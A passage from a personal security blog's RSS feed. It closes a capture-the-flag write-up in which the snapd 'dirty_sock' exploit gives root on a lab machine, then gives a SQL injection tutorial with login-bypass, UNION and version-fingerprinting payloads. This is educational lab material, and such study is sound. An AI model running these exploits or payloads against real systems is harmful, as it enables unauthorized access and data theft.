+<pre><code>www-data@petshop:/dev/shm$ ls -alh /usr/bin/
+</code></pre><p>After the run, I found interesting about <code>Snapd</code> checking this with searchsploit.</p>
+<pre><code>root@kali:~# searchsploit snapd 2.32.5
+----------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                 |  Path
+----------------------------------------------------------------------------------------------------------------
+snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)            | linux/local/46361.py
+snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)            | linux/local/46362.py
+----------------------------------------------------------------------------------------------------------------
+</code></pre><p>Actually it&rsquo;s a dirty Sock exploit. Learn more about <a href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html">DirtySock</a></p>
+<p>Let&rsquo;s Copy Dirty Sock 46362.py</p>
+<pre><code>root@kali:~# searchsploit -m linux/local/46362.py
+  Exploit: snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
+      URL: https://www.exploit-db.com/exploits/46362
+     Path: /usr/share/exploitdb/exploits/linux/local/46362.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /root/46362.py
+</code></pre><p>Let&rsquo;s run the exploit to be a <strong>Root user</strong></p>
+<p><img src="/img/blog/YOJ4.png" alt="img"></p>
+<pre><code>www-data@petshop:/dev/shm$ python3 dirty.py
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      |  \ | |__/  |   \_/      [__  |  | |    |_/  
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&amp;D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/lwczffgrbu;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+
+
+
+********************
+Success! You can now `su` to the following account and use sudo:
+   username: dirty_sock
+   password: dirty_sock
+********************
+</code></pre><p>That&rsquo;s it we got username and password</p>
+<pre><code>www-data@petshop:/dev/shm$ su dirty_sock
+Password: dirty_sock
+
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+dirty_sock@petshop:/dev/shm$ sudo whoami
+[sudo] password for dirty_sock: dirty_sock
+
+root
+dirty_sock@petshop:/dev/shm$ sudo bash
+root@petshop:/dev/shm# 
+</code></pre><blockquote>
+<p>Hurray! Now I&rsquo;m the root user</p>
+</blockquote>
+<p>Flag 2 - <code>root@petshop:/root# cat root.txt</code></p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>SQL Injection</title>
+			<link>https://riteshpuvvada.github.io/posts/sql_writeup/</link>
+			<pubDate>Wed, 19 May 2021 16:41:12 +0530</pubDate>
+			
+			<guid>https://riteshpuvvada.github.io/posts/sql_writeup/</guid>
+			<description>What is SQL injection? SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&amp;rsquo;s content or behavior.</description>
+			<content type="html"><![CDATA[<h3 id="what-is-sql-injection">What is SQL injection?</h3>
+<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&rsquo;s content or behavior.</p>
+<p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>
+<p><img src="/img/blog/sql.png" alt="img"></p>
+<h3 id="what-is-the-impact-of-a-sql-injection">What is the impact of a SQL injection?</h3>
+<p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. In recent years, many high-profile data breaches have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization&rsquo;s systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>
+<h3 id="sql-injection-examples">SQL injection examples</h3>
+<p>There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:</p>
+<ul>
+<li><code>Retrieving hidden data</code>, where you can modify an SQL query to return additional results.</li>
+<li><code>Subverting application logic</code>, where you can change a query to interfere with the application&rsquo;s logic.</li>
+<li><code>UNION attacks</code>, where you can retrieve data from different database tables.</li>
+<li><code>Examining the database</code>, where you can extract information about the version and structure of the database.</li>
+<li><code>Blind SQL injection</code>, where the results of a query you control are not returned in the application&rsquo;s responses.</li>
+</ul>
+<h4 id="retrieving-hidden-data">Retrieving hidden data</h4>
+<blockquote>
+<p>Consider a application that displays results in different categories.</p>
+</blockquote>
+<pre><code>https://website.com/items?category=Fruits
+</code></pre><blockquote>
+<p>This causes the application to make an SQL query to retrieve details.</p>
+</blockquote>
+<pre><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+</code></pre><blockquote>
+<p>It returns all the details from the database, attacker construct a SQL query like.</p>
+</blockquote>
+<pre><code>https://website.com/items?category=Fruits'--
+
+!Query 
+Select * From items where category = 'Fruits'--' AND released = 1
+</code></pre><p>You can study more about <strong>Retrieving hidden data</strong> on <a href="https://portswigger.net/web-security/sql-injection#retrieving-hidden-data">PortSwigger</a></p>
+<h4 id="subverting-application-logic">Subverting application logic</h4>
+<blockquote>
+<p>Suppose a application has login page where user can enter his username and password for example:</p>
+</blockquote>
+<pre><code>Username = Anonymous
+Password = 12345
+</code></pre><blockquote>
+<p>The application checks <code>SELECT * FROM users WHERE username = 'Anonymous' AND password = '12345'</code> If the query returns the details of a user, then the login is successful.</p>
+</blockquote>
+<p>Here, an attacker make a simple change by using SQL comment sequence <code>--</code> to remove the password check, so he has full access to login as any user. For example</p>
+<pre><code>Username = admin'--
+Password = 
+!Blank password
+
+The query be like
+SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+</code></pre><blockquote>
+<p>The attacker can login easily as admin</p>
+</blockquote>
+<p>You can study more about <strong>Subverting application logic</strong> on <a href="https://portswigger.net/web-security/sql-injection#subverting-application-logic">PortSwigger</a></p>
+<h4 id="union-attacks">UNION attacks</h4>
+<blockquote>
+<p>If the application is vulnerable to SQL injection, the <code>UNION</code> can used to retrieve data from other tables within the database.</p>
+</blockquote>
+<pre><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+</code></pre><p>You can study more about <strong>UNION attacks</strong> on <a href="https://portswigger.net/web-security/sql-injection/union-attacks">PortSwigger</a></p>
+<h4 id="examining-the-database">Examining the database</h4>
+<blockquote>
+<p>When an attacker exploiting SQL injection vulnerability, it is necessary to gather information about the type of database.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Database type</th>
+<th style="text-align:center">Query</th>
+<th style="text-align:center">Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Microsoft, MySQL</td>
+<td style="text-align:center"><code>SELECT @@version</code></td>
+<td style="text-align:center"><code>' UNION SELECT @@version--</code></td>
+</tr>
+<tr>
+<td style="text-align:center">Oracle</td>
+<td style="text-align:center"><code>SELECT * FROM v$version</code></td>
+<td style="text-align:center"><code>' UNION SELECT * FROM v$version </code></td>
+</tr>
+<tr>
+<td style="text-align:center">PostgreSQL</td>
+<td style="text-align:center"><code>SELECT version()</code></td>
+<td style="text-align:center"><code>' UNION SELECT version() </code></td>
+</tr>
+</tbody>
+</table>
+<p>You can study more about <strong>Examining the database</strong> on <a href="https://portswigger.net/web-security/sql-injection/examining-the-database">PortSwigger</a></p>
+<h4 id="blind-sql-injection">Blind SQL injection</h4>
+<blockquote>
+<p>Blind SQL injection asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>
+</blockquote>
+<p>You can study more about <strong>Blind SQL injection</strong> on <a href="https://portswigger.net/web-security/sql-injection/blind">PortSwigger</a> and <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">OWASP</a></p>
+<p><em><strong>Get your hands dirty on SQL injection with TryHackMe</strong></em></p>
+<ul>
+<li><a href="https://tryhackme.com/room/sqlilab">Link to the room</a></li>
+<li>A detail writeup of SQL injection room <a href="https://riteshpuvvada.medium.com/sql-injection-lab-735ec68b3be5">My writeup</a></li>
+<li>Checkout my THM profile <a href="https://tryhackme.com/p/RiteshPuvvada">Profile</a></li>
+</ul>
+]]></content>
+		</item>
+		
+	</channel>
+</rss>
